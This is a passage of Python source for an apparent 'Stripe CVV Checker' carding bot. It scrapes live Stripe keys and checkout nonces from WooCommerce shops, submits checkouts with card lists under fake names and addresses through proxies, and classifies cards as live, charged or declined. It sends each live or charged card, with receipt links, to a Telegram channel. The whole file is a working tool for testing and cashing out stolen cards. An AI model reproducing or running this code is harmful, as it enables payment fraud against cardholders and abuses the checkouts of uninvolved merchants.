            attributes = first_variation.get('attributes', {})
            if attributes:
                first_attr_key = list(attributes.keys())[0]
                query_params[f'attribute_{first_attr_key}'] = attributes[first_attr_key]
            query_params['product_id'] = product_id
            query_params['variation_id'] = variation_id
        
        final_url = f"{product_page_url}?{urlencode(query_params)}"
        
        # Determine country and address
        country = get_country_from_domain(hostname)
        if country not in ADDRESSES:
            country = 'US'
        
        index = int(time.time() / 10) % min(2, len(ADDRESSES[country]))
        selected_address = ADDRESSES[country][index]
        
        street = selected_address['street']
        city = selected_address['city']
        zip_code = selected_address['zip']
        state = selected_address['state']
        phone = selected_address['phone']
        
        # Generate random name and email
        fname, lname = generate_random_name()
        email = generate_random_email(fname, lname)
        
        # Add to cart
        headers['X-Requested-With'] = 'XMLHttpRequest'
        session.get(final_url, headers=headers, proxies=proxies, timeout=20, verify=False)
        
        # Get checkout page
        checkout_url = f"https://{hostname}/checkout"
        checkout_response = session.get(checkout_url, headers=headers, proxies=proxies, timeout=20, verify=False)
        checkout_content = checkout_response.text
        
        # Extract Stripe key
        pk_live = None
        pk_match = re.search(r'"(?:api_key|key)":"(pk_live_[A-Za-z0-9_]+)"', checkout_content)
        if pk_match:
            pk_live = pk_match.group(1)
        
        if not pk_live:
            bin_info = get_bin_info(cc6, session, ua)
            elapsed_time = time.time() - time_start
            return format_response("DECLINED", "❌", lista, "N/A", "No Stripe key found", bin_info, elapsed_time)
        
        # Extract nonce
        nonce_match = re.search(r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"', checkout_content)
        nonce = nonce_match.group(1) if nonce_match else ''
        
        # Extract price
        price1 = ''
        price_match = re.search(r'class="woocommerce-Price-currencySymbol">([^<]+)</span>\s*([\d.]+)', checkout_content)
        if price_match:
            price1 = f"{price_match.group(1)}{price_match.group(2)}"
        
        # Create Stripe payment method
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mes,
            'card[exp_year]': ano,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': pk_live,
        }
        
        stripe_headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
        }
        
        stripe_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            data=stripe_data,
            headers=stripe_headers,
            proxies=proxies,
            timeout=20
        )
        stripe_result = stripe_response.text
        
        # Check for Stripe API errors first
        if '"error"' in stripe_result:
            bin_info = get_bin_info(cc6, session, ua)
            elapsed_time = time.time() - time_start
            
            # Extract error message from Stripe response
            error_message = get_str(stripe_result, '"message": "', '"')
            if not error_message:
                error_message = get_str(stripe_result, '"message":"', '"')
            
            error_code = get_str(stripe_result, '"code": "', '"')
            if not error_code:
                error_code = get_str(stripe_result, '"code":"', '"')
            
            decline_code = get_str(stripe_result, '"decline_code": "', '"')
            if not decline_code:
                decline_code = get_str(stripe_result, '"decline_code":"', '"')
            
            # Handle specific Stripe error codes
            if error_code == "incorrect_cvc" or "security code" in error_message.lower():
                telegram_msg = f"[#CCN] - {lista} [STRIPE CCN LIVED]\n[Security code incorrect]\n[{price1}]\n[{hostname}]"
                send_to_telegram(telegram_msg)
                return format_response("CCN", "✅", lista, price1, "Security Code Incorrect", bin_info, elapsed_time)
            elif error_code == "card_declined":
                if decline_code == "insufficient_funds":
                    telegram_msg = f"[#CVV] - {lista} [STRIPE CVV LIVED]\n[Insufficient funds]\n[{price1}]\n[{hostname}]"
                    send_to_telegram(telegram_msg)
                    return format_response("CVV", "✅", lista, price1, "Insufficient Funds", bin_info, elapsed_time)
                elif decline_code == "lost_card":
                    return format_response("DECLINED", "❌", lista, price1, "Lost Card", bin_info, elapsed_time)
                elif decline_code == "stolen_card":
                    return format_response("DECLINED", "❌", lista, price1, "Stolen Card", bin_info, elapsed_time)
                elif decline_code == "generic_decline":
                    return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
                elif decline_code == "do_not_honor":
                    return format_response("DECLINED", "❌", lista, price1, "Do Not Honor", bin_info, elapsed_time)
                elif decline_code == "fraudulent":
                    return format_response("DECLINED", "❌", lista, price1, "Fraudulent Card", bin_info, elapsed_time)
                elif decline_code:
                    return format_response("DECLINED", "❌", lista, price1, f"Declined: {decline_code}", bin_info, elapsed_time)
                else:
                    return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
            elif error_code == "expired_card":
                return format_response("DECLINED", "❌", lista, price1, "Expired Card", bin_info, elapsed_time)
            elif error_code == "invalid_card_number" or error_code == "incorrect_number":
                return format_response("DECLINED", "❌", lista, price1, "Invalid Card Number", bin_info, elapsed_time)
            elif error_code == "invalid_expiry_month" or error_code == "invalid_expiry_year":
                return format_response("DECLINED", "❌", lista, price1, "Invalid Expiry Date", bin_info, elapsed_time)
            elif error_code == "processing_error":
                return format_response("DECLINED", "❌", lista, price1, "Processing Error", bin_info, elapsed_time)
            elif error_message:
                return format_response("DECLINED", "❌", lista, price1, error_message[:50], bin_info, elapsed_time)
            else:
                return format_response("DECLINED", "❌", lista, price1, "Stripe API Error", bin_info, elapsed_time)
        
        payment_id = get_str(stripe_result, '"id": "', '"')
        if not payment_id:
            payment_id = get_str(stripe_result, '"id":"', '"')
        
        # If still no payment_id, the card might be invalid
        if not payment_id:
            bin_info = get_bin_info(cc6, session, ua)
            elapsed_time = time.time() - time_start
            return format_response("DECLINED", "❌", lista, price1, "Failed to create payment method", bin_info, elapsed_time)
        
        # Detect payment method
        payment_methods = [
            'fkwcs_stripe', 'stripe_cc', 'superpayments', 'yith-stripe',
            'yith-stripe-connect', 'eh_stripe_pay', 'stripe'
        ]
        
        selected_payment_method = None
        for method in payment_methods:
            if f'value="{method}"' in checkout_content:
                selected_payment_method = method
                break
        
        if not selected_payment_method:
            selected_payment_method = 'stripe'
        
        # Submit checkout
        checkout_data = {
            'billing_first_name': fname,
            'billing_last_name': lname,
            'billing_company': '',
            'billing_country': country,
            'billing_address_1': street,
            'billing_address_2': '',
            'billing_city': city,
            'billing_state': state,
            'billing_postcode': zip_code,
            'billing_phone': phone,
            'billing_email': email,
            'account_password': lname,
            'account_username': fname,
            'shipping_first_name': '',
            'shipping_last_name': '',
            'shipping_company': '',
            'shipping_country': '',
            'shipping_address_1': '',
            'shipping_address_2': '',
            'shipping_city': '',
            'shipping_state': '',
            'shipping_postcode': '',
            'shipping_phone': '',
            'order_comments': '',
            'payment_method': selected_payment_method,
            'fkwcs_source': payment_id,
            'stripe_cc_token_key': payment_id,
            'stripe_source': payment_id,
            'stripe_payment_method': payment_id,
            'eh_stripe_pay_token': payment_id,
            'stripe_connect_payment_method': payment_id,
            'woocommerce-process-checkout-nonce': nonce,
            '_wp_http_referer': '/?wc-ajax=update_order_review',
        }
        
        wc_ajax_url = f"https://{hostname}/?wc-ajax=checkout"
        payment_response = session.post(
            wc_ajax_url,
            data=checkout_data,
            headers=headers,
            proxies=proxies,
            timeout=20,
            verify=False
        )
        payment_result = payment_response.text
        
        # Get BIN info
        bin_info = get_bin_info(cc6, session, ua)
        
        # Parse response
        try:
            payment_json = json.loads(payment_result)
            messages = payment_json.get('messages', '')
            # Strip HTML tags
            messages = re.sub(r'<[^>]+>', '', messages)
            redirect = payment_json.get('redirect', '')
        except Exception:
            messages = ''
            redirect = ''
        
        hostname1 = f"http://{hostname}" if not hostname.startswith('http') else hostname
        
        # Calculate elapsed time
        elapsed_time = time.time() - time_start
        
        # Check responses
        if '"redirect":"#response' in payment_result or '"result":"success","redirect":"#yith-confirm-pi-' in payment_result:
            return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
        
        elif '"result":"success"' in payment_result:
            receipt_url = redirect.replace('\\/', '/')
            telegram_msg = f"[#CHARGED] - {lista} [STRIPE CVV CHARGED]\n[{receipt_url}]\n[{email}]\n[{price1}]\n[{hostname1}]"
            send_to_telegram(telegram_msg)
            return format_response("CVV", "✅", lista, price1, f"Charged Successfully | Receipt: {receipt_url}", bin_info, elapsed_time)
        
        elif "card's security code is incorrect" in payment_result.lower() or "card's security code is invalid" in payment_result.lower():
            telegram_msg = f"[#CCN] - {lista} [STRIPE CCN LIVED]\n[Security code incorrect]\n[{price1}]\n[{hostname1}]"
            send_to_telegram(telegram_msg)
            return format_response("CCN", "✅", lista, price1, "Security Code Incorrect", bin_info, elapsed_time)
        
        elif "insufficient funds" in payment_result.lower():
            telegram_msg = f"[#CVV] - {lista} [STRIPE CVV LIVED]\n[Insufficient funds]\n[{price1}]\n[{hostname1}]"
            send_to_telegram(telegram_msg)
            return format_response("CVV", "✅", lista, price1, "Insufficient Funds", bin_info, elapsed_time)
        
        elif "unable to process your order" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Nonce Error", bin_info, elapsed_time)
        
        elif '"redirect":"#confirm' in payment_result:
            return format_response("CCN", "✅", lista, price1, "3DS Verification Required", bin_info, elapsed_time)
        
        elif 'result":"failure","messages":"","refresh":false,"reload":true' in payment_result:
            return format_response("DECLINED", "❌", lista, price1, "Card Declined", bin_info, elapsed_time)
        
        elif "payment processing failed" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Payment Processing Failed", bin_info, elapsed_time)
        
        elif "card was declined" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Card Was Declined", bin_info, elapsed_time)
        
        elif "do not honor" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Do Not Honor", bin_info, elapsed_time)
        
        elif "lost card" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Lost Card", bin_info, elapsed_time)
        
        elif "stolen card" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Stolen Card", bin_info, elapsed_time)
        
        elif "expired card" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Expired Card", bin_info, elapsed_time)
        
        elif "invalid card" in payment_result.lower() or "incorrect number" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Invalid Card Number", bin_info, elapsed_time)
        
        elif "fraudulent" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Fraudulent Card", bin_info, elapsed_time)
        
        elif "pickup card" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Pickup Card", bin_info, elapsed_time)
        
        elif "restricted card" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Restricted Card", bin_info, elapsed_time)
        
        elif "transaction not allowed" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Transaction Not Allowed", bin_info, elapsed_time)
        
        elif "try again" in payment_result.lower():
            return format_response("DECLINED", "❌", lista, price1, "Try Again Later", bin_info, elapsed_time)
        
        else:
            # Try to extract a meaningful error message
            error_msg = messages if messages else "Unknown Error"
            # Clean up the error message
            if error_msg and len(error_msg) > 100:
                error_msg = error_msg[:100] + "..."
            return format_response("DECLINED", "❌", lista, price1, error_msg, bin_info, elapsed_time)
    
    except requests.exceptions.RequestException as e:
        bin_info = get_bin_info(cc6, session, ua)
        elapsed_time = time.time() - time_start
        return format_response("DECLINED", "❌", lista, "N/A", f"Request Failed: {str(e)[:50]}", bin_info, elapsed_time)
    except Exception as e:
        elapsed_time = time.time() - time_start
        bin_info = {
            'brand': 'Not found', 'type': 'Not found', 'level': 'Not found',
            'bank': 'Not found', 'country': 'Not found', 'flag': '🏳️'
        }
        return format_response("DECLINED", "❌", lista, "N/A", f"Error: {str(e)[:50]}", bin_info, elapsed_time)


def load_sites_from_file(filepath: str) -> str:
    """Load sites from a file"""
    try:
        with open(filepath, 'r') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return ','.join(lines)
    except Exception as e:
        return ''


# Main execution for CLI usage
if __name__ == '__main__':
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Stripe CVV Checker')
    parser.add_argument('--lista', '-l', required=True, help='Card data in format CC|MM|YY|CVV')
    parser.add_argument('--sites', '-s', help='Comma-separated site URLs or path to sites.txt')
    parser.add_argument('--proxy', '-p', help='Proxy in format IP:PORT or IP:PORT:USER:PASS')
    
    args = parser.parse_args()
    
    # Load sites
    sites = args.sites
    if not sites:
        # Try to load from default sites.txt
        script_dir = os.path.dirname(os.path.abspath(__file__))
        sites_file = os.path.join(script_dir, 'sites.txt')
        sites = load_sites_from_file(sites_file)
    elif os.path.isfile(args.sites):
        sites = load_sites_from_file(args.sites)
    
    if not sites:
        print("DECLINED ❌\n\n𝗖𝗖 ⇾ N/A\n\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge \"N/A\"\n\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ No sites provided. Use --sites or create sites.txt\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: N/A - N/A - N/A\n\n𝗕𝗮𝗻𝗸: N/A\n\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: N/A 🏳️\n\n𝗧𝗼𝗼𝗸 0.00 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n\n𝗕𝗼𝘁 𝗯𝘆 : @TUMAOB")
        sys.exit(1)
    
    result = process_card(args.lista, sites, args.proxy)
    print(result)
